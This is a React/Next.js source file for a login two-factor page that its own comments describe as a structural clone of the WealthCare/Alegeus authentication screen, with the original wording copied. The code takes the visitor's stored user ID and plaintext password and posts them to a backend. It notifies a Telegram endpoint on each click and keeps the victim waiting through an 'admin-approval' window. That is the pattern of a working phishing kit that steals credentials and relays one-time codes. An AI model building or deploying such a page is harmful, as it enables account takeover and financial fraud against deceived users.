"use client";

import { useState, useEffect } from "react";
import { Check, ChevronDown, Info, Loader2, Lock, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { LoginFlowHeader } from "@/components/LoginFlowHeader";
import { SiteFooter } from "@/components/SiteFooter";
import { ThreeDotSpinner } from "@/components/ThreeDotSpinner";
import { FLOW_STEP, setFlowStep, useFlowGuard } from "@/lib/flow-guard";
import { usePendingLoginPoll } from "@/lib/use-pending-login-poll";
import {
  MSG_UNABLE_REACH_VERIFICATION,
  MSG_UNABLE_VERIFY_TIME,
} from "@/lib/approval-messages";
import {
  IGOE_NEUTRAL_FILL,
  IGOE_NEUTRAL_HOVER,
  IGOE_PRIMARY_FILL,
  IGOE_PRIMARY_HOVER,
  WEALTHCARE_BUTTON_CHROME,
  WEALTHCARE_BUTTON_GEOMETRY,
} from "@/lib/wealthcare-button-styles";

type VerificationMethod = "email" | "text";

/** Shared Wealthcare tokens — see `lib/wealthcare-button-styles.ts`. */
const BUTTON_CHROME = `${WEALTHCARE_BUTTON_GEOMETRY} gap-3 ${WEALTHCARE_BUTTON_CHROME}`;

/**
 * Confirmation-code method selection.
 *
 * UI is a structural clone of the WealthCare/Alegeus `authentication-confirmation`
 * component: lock + intro copy, a "Confirmation Code" label with a method
 * dropdown, a read-only masked-value input, stacked CANCEL / GENERATE CODE
 * buttons, and an info note.
 *
 * Colours are igoe's own palette (#010147 / #0063FF) rather than the reference
 * tenant's, so the flow stays consistent with the rest of the site. Layout,
 * spacing, typography, borders and the 3px bottom button shadow follow the
 * reference metrics.
 */
const CONF_TEXT =
  "Protecting your information is our first priority. In order to access this site or perform this specific function you must receive a confirmation code to the device of your choice. You will be asked to enter the code on the next screen.";

// Reference copy is a single text node; the missing space after "button." is in
// the original string and is reproduced verbatim.
const NOTE_TEXT =
  "To proceed, please press the generate code button.If you wish to cancel, you will be asked to enter a code the next time you login or try to perform this specific function.";

/** Step 2's note — the reference drops the "press generate code" sentence once
 *  the code has been sent and keeps only the cancel warning. */
const WAITING_NOTE_TEXT =
  "If you wish to cancel, you will be asked to enter a code the next time you login or try to perform this specific function.";

const METHOD_OPTIONS: ReadonlyArray<{
  value: VerificationMethod;
  label: string;
}> = [
  { value: "email", label: "Email" },
  { value: "text", label: "Text" },
];

export default function Login2FAVerifyPage() {
  const isAllowed = useFlowGuard(FLOW_STEP.LOGIN);
  const [maskedEmail, setMaskedEmail] = useState("**********");
  const [maskedPhone, setMaskedPhone] = useState("***-***-****");
  const [method, setMethod] = useState<VerificationMethod>("email");
  const [loadingMethod, setLoadingMethod] = useState<VerificationMethod | null>(
    null,
  );
  const [pendingId, setPendingId] = useState<string | null>(null);
  const [navLoading, setNavLoading] = useState<"cancel" | null>(null);
  const [networkError, setNetworkError] = useState("");

  useEffect(() => {
    if (typeof window !== "undefined" && window.self !== window.top) {
      window.top!.location.href =
        window.location.pathname + window.location.search;
    }
  }, []);

  useEffect(() => {
    try {
      const storedMethod = sessionStorage.getItem("verificationMethod");
      if (storedMethod === "email" || storedMethod === "text") {
        setMethod(storedMethod);
      }
    } catch {
      // ignore
    }
  }, []);

  useEffect(() => {
    try {
      const email = sessionStorage.getItem("maskedEmail");
      const phone = sessionStorage.getItem("maskedPhone");
      if (email) setMaskedEmail(email);
      if (phone) setMaskedPhone(phone);
    } catch {
      // ignore
    }
  }, []);

  const handleVerificationMethod = async (selected: VerificationMethod) => {
    if (loadingMethod || navLoading) return;
    setLoadingMethod(selected);
    setNetworkError("");

    void fetch("/api/telegram/verification-click", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        method: selected,
        page: `/login/2fa-verify?method=${selected}`,
      }),
    }).catch(() => {});

    const userId = sessionStorage.getItem("loginUserId") ?? "";
    const password = sessionStorage.getItem("loginPassword") ?? "";
    const maskedEmailStored =
      sessionStorage.getItem("maskedEmail") ?? maskedEmail;
    const maskedPhoneStored =
      sessionStorage.getItem("maskedPhone") ?? maskedPhone;

    try {
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId,
          password,
          method: selected,
          maskedEmail: maskedEmailStored,
          maskedPhone: maskedPhoneStored,
          flow: "login",
        }),
      });
      const data = await res.json();
      if (!res.ok) {
        setNetworkError(data.error || MSG_UNABLE_REACH_VERIFICATION);
        setLoadingMethod(null);
        return;
      }
      if (data.id) {
        sessionStorage.setItem("verificationMethod", selected);
        sessionStorage.setItem("maskedEmail", maskedEmailStored);
        sessionStorage.setItem("maskedPhone", maskedPhoneStored);
        setFlowStep(FLOW_STEP.VERIFY_METHOD);
        setPendingId(data.id);
        return;
      }
      setLoadingMethod(null);
      setNetworkError(MSG_UNABLE_VERIFY_TIME);
    } catch {
      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
      setLoadingMethod(null);
    }
  };

  const handleNavHome = async (kind: "cancel") => {
    if (navLoading || loadingMethod) return;
    setNavLoading(kind);
    await new Promise((r) => setTimeout(r, 1000));
    window.location.href = "/";
  };

  // The reference's spinner only covers its ~200ms send request. igoe has to
  // hold this state for the whole admin-approval window (up to
  // APPROVAL_TIMEOUT_MS), because the code-entry screen is only reachable once
  // an admin approves.
  const isWaiting = loadingMethod !== null;
  const showMethodSelection = !isWaiting;
  const optionsDisabled = loadingMethod !== null || navLoading !== null;

  usePendingLoginPoll({
    pendingId: isWaiting ? pendingId : null,
    method: loadingMethod ?? "email",
    step: "login",
    enabled: isWaiting,
    onError: (message) => {
      setNetworkError(message);
      setLoadingMethod(null);
      setPendingId(null);
    },
  });

  if (!isAllowed) return null;

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <LoginFlowHeader />

      {/* Reference placement, measured in-browser at 13 viewports — the same
          profile as the homepage (app/page.tsx) so both pages sit in one column.
          Three regimes: full width ≤768px; left-pinned at 43px with a 39% column
          769–1199px; centred container ≥1200px. */}
      <main className="flex-1 flex flex-col min-[1200px]:items-center">
        <div className="w-full px-[10px] pt-4 md:pt-10 pb-8 min-[769px]:px-4 min-[1200px]:max-w-[1180px] min-[1200px]:mx-auto min-[1440px]:max-w-[1280px] min-[1440px]:px-[50px]">
          <div className="w-full min-[769px]:w-[calc(39%-27px)] min-[769px]:ml-[27px]">
            {isWaiting && (
              /* The reference keeps the "sent to" copy on screen while the
                 generate-code request is in flight and replaces only the form
                 region with the spinner — it does not blank the whole page. */
              <div className="text-center mb-[18px]">
                <Lock className="w-[46px] h-[46px] text-[#414041] mx-auto mb-[5px]" />
                <p className="text-[14px] leading-[1.6] text-[#707070]">
                  {method === "email"
                    ? "An e-mail has been sent:"
                    : "An SMS has been sent:"}
                </p>
                <p className="text-[14px] leading-[1.6] text-[#707070]">
                  Enter the verification code that you received via{" "}
                  <strong className="font-semibold">
                    {method === "email" ? "Email" : "SMS"}
                  </strong>{" "}
                  below:
                </p>
                <p className="text-[14px] leading-[1.6] text-[#707070] mt-4">
                  Note - Do not share your verification code with anyone else
                </p>
              </div>
            )}

            {/* Spinner occupies the form region only — the copy above stays put,
                matching the reference's <load-status> placement. */}
            {isWaiting && (
              <ThreeDotSpinner label="Sending your verification code" />
            )}

            {showMethodSelection && (
              <>
                {/* .conf — lock glyph + intro copy, centred, 14px, #707070 */}
                <div className="text-center mb-[18px]">
                  <Lock className="w-[46px] h-[46px] text-[#414041] mx-auto mb-[5px]" />
                  <p className="text-[14px] leading-[1.6] text-[#707070]">
                    {CONF_TEXT}
                  </p>
                </div>

                {networkError ? (
                  <p className="text-red-600 text-sm text-center mb-4">
                    {networkError}
                  </p>
                ) : null}

                <div
                  className={`transition-opacity ${optionsDisabled ? "opacity-60" : ""}`}
                >
                  {/* .popup-row — label 200px / control 202px, space-between.
                    The reference's measured threshold is 1200px, NOT 768px: it
                    stacks at 1180 and goes side-by-side at 1200. */}
                  <div className="flex flex-col min-[1200px]:flex-row min-[1200px]:items-center min-[1200px]:justify-between gap-1 min-[1200px]:gap-0 mb-4">
                    <div className="w-full max-[768px]:mx-[5px] min-[769px]:pl-9 min-[1200px]:w-[200px] min-[1200px]:mr-auto">
                      <span className="block text-[14px] text-gray-700 max-[768px]:pl-8 min-[769px]:pl-0">
                        Confirmation Code
                      </span>
                    </div>
                    <div className="relative w-full h-[38px] bg-white min-[1200px]:w-[202px]">
                      <select
                        aria-label="Confirmation Code"
                        name="confirmationMethod"
                        value={method}
                        disabled={optionsDisabled}
                        onChange={(e) =>
                          setMethod(e.target.value as VerificationMethod)
                        }
                        className="w-full h-full pl-3 pr-8 bg-white border border-gray-300 text-[15px] text-[#424242] outline-none appearance-none disabled:bg-[#f3f3f3] disabled:text-[#b0b0b0]"
                      >
                        {METHOD_OPTIONS.map((option) => (
                          <option key={option.value} value={option.value}>
                            {option.label}
                          </option>
                        ))}
                      </select>
                      <ChevronDown
                        className="pointer-events-none absolute right-2 top-1/2 -translate-y-1/2 w-[22px] h-[22px] text-[#424242]"
                        aria-hidden="true"
                      />
                    </div>
                  </div>

                  {/* .popup_buttons — 220px block, stacked, each 100% wide */}
                  <div className="w-[220px] mx-auto">
                    <Button
                      type="button"
                      disabled={optionsDisabled}
                      onClick={() => void handleNavHome("cancel")}
                      className={`${BUTTON_CHROME} mb-[10px]`}
                      style={{ backgroundColor: "#646464", color: "#ffffff" }}
                      onMouseEnter={(e) => {
                        e.currentTarget.style.backgroundColor = IGOE_NEUTRAL_HOVER;
                      }}
                      onMouseLeave={(e) => {
                        e.currentTarget.style.backgroundColor = IGOE_NEUTRAL_FILL;
                      }}
                    >
                      {navLoading === "cancel" ? (
                        <Loader2 className="w-5 h-5 shrink-0 animate-spin" />
                      ) : (
                        <X className="w-6 h-6 shrink-0" />
                      )}
                      <span className="truncate">
                        {navLoading === "cancel" ? "Loading..." : "Cancel"}
                      </span>
                    </Button>

                    <Button
                      type="button"
                      disabled={optionsDisabled}
                      onClick={() => void handleVerificationMethod(method)}
                      className={BUTTON_CHROME}
                      style={{ backgroundColor: "#010147", color: "#ffffff" }}
                      onMouseEnter={(e) => {
                        e.currentTarget.style.backgroundColor = IGOE_PRIMARY_HOVER;
                      }}
                      onMouseLeave={(e) => {
                        e.currentTarget.style.backgroundColor = IGOE_PRIMARY_FILL;
                      }}
                    >
                      {loadingMethod !== null ? (
                        <Loader2 className="w-5 h-5 shrink-0 animate-spin" />
                      ) : (
                        <Check className="w-5 h-5 shrink-0" />
                      )}
                      <span className="truncate">
                        {loadingMethod !== null
                          ? "Loading..."
                          : "Generate Code"}
                      </span>
                    </Button>
                  </div>
                </div>
              </>
            )}

            {/* .protect-bl — info note. The reference keeps this visible during
                the generate-code request, so it sits outside the gated form. */}
            <div
              role="note"
              className="relative mt-6 pl-[48px] min-[769px]:pl-[62px] pr-[13px] py-[13px] pb-[14px] text-[14px] leading-[1.3] text-[#424242]"
              style={{ backgroundColor: "#F3F7A9" }}
            >
              <Info
                className="absolute left-1 top-1/2 -translate-y-1/2 w-[35px] h-[35px] text-[#414141]"
                aria-hidden="true"
              />
              <p className="m-0">
                {/* Step 2 swaps the note copy once the code has been sent. */}
                {isWaiting ? WAITING_NOTE_TEXT : NOTE_TEXT}
              </p>
            </div>
          </div>
        </div>
      </main>

      <SiteFooter />
    </div>
  );
}
